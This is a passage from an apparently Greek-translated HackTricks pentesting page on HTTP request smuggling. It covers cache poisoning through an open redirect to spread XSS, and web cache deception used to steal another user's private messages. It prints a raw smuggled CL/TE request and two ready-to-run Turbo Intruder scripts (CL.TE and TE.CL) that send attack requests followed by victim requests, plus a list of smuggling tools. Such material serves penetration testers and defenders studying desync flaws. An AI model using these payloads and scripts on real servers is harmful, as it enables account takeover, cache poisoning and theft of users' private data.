Σημειώστε το ενσωματωμένο αίτημα που στοχεύει στο `/post/next?postId=3`. Αυτό το αίτημα θα ανακατευθυνθεί στο `/post?postId=4`, χρησιμοποιώντας την τιμή της **κεφαλίδας Host** για να προσδιορίσει τον τομέα. Αλλάζοντας την **κεφαλίδα Host**, ο επιτιθέμενος μπορεί να ανακατευθύνει το αίτημα στον δικό του τομέα (**επανακατεύθυνση στον ιστότοπο για ανοικτή ανακατεύθυνση**).

Μετά από επιτυχή **δηλητηρίαση socket**, θα πρέπει να εκκινηθεί ένα **GET αίτημα** για το `/static/include.js`. Αυτό το αίτημα θα μολυνθεί από το προηγούμενο αίτημα **επανακατεύθυνση στον ιστότοπο για ανοικτή ανακατεύθυνση** και θα ανακτήσει το περιεχόμενο του script που ελέγχεται από τον επιτιθέμενο.

Στη συνέχεια, οποιοδήποτε αίτημα για το `/static/include.js` θα εξυπηρετεί τον κρυφό κώδικα του επιτιθέμενου, εκκινώντας αποτελεσματικά μια ευρεία επίθεση XSS.

### Χρήση της χρήσης HTTP request smuggling για να πραγματοποιήσετε απάτη στην προσωρινή μνήμη του ιστού <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Ποια είναι η διαφορά μεταξύ δηλητηρίασης της προσωρινής μνήμης του ιστού και απάτης της προσωρινής μνήμης του ιστού;**
>
> * Στη **δηλητηρίαση της προσωρινής μνήμης του ιστού**, ο επιτιθέμενος προκαλεί την εφαρμογή να αποθηκεύσει κάποιο κακόβουλο περιεχόμενο στη μνήμη cache, το οποίο σερβίρεται από τη μνήμη cache σε άλλους χρήστες της εφαρμογής.
> * Στην **απάτη της προσωρινής μνήμης του ιστού**, ο επιτιθέμενος προκαλεί την εφαρμογή να αποθηκεύσει κάποιο ευαίσθητο περιεχόμενο που ανήκει σε άλλο χρήστη στη μνήμη cache, και στη συνέχεια ο επιτιθέμενος ανακτά αυτό το περιεχόμενο από τη μνήμη cache.

Ο επιτιθέμενος δημιουργεί ένα αιτούμενο αίτημα που ανακτά ευαίσθητο περιεχόμενο που αφορά συγκεκριμένο χρήστη. Λάβετε υπόψη το ακόλουθο παράδειγμα:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Εάν αυτό το κρυφό αίτημα δηλητηριάσει μια καταχώρηση cache που προορίζεται για στατικό περιεχόμενο (π.χ., `/someimage.png`), τα ευαίσθητα δεδομένα του θύματος από το `/private/messages` ενδέχεται να αποθηκευτούν υπό την καταχώρηση cache του στατικού περιεχομένου. Ως εκ τούτου, ο επιτιθέμενος θα μπορούσε πιθανόν να ανακτήσει αυτά τα αποθηκευμένα ευαίσθητα δεδομένα.

### Οπλοποιώντας το HTTP Request Smuggling με την Ασυμφωνία Απάντησης HTTP

Βρήκατε μια ευπάθεια HTTP Request Smuggling και δεν ξέρετε πώς να την εκμεταλλευτείτε. Δοκιμάστε αυτήν τη μέθοδο εκμετάλλευσης:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Σενάρια Turbo Intruder

### CL.TE

Από [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Από: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Εργαλεία

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Αυτό το εργαλείο είναι ένας HTTP Fuzzer βασισμένος σε γραμματική, χρήσιμο για την εύρεση παράξενων ανισοτήτων στην αιτηματολογία.

## Αναφορές

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**Την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
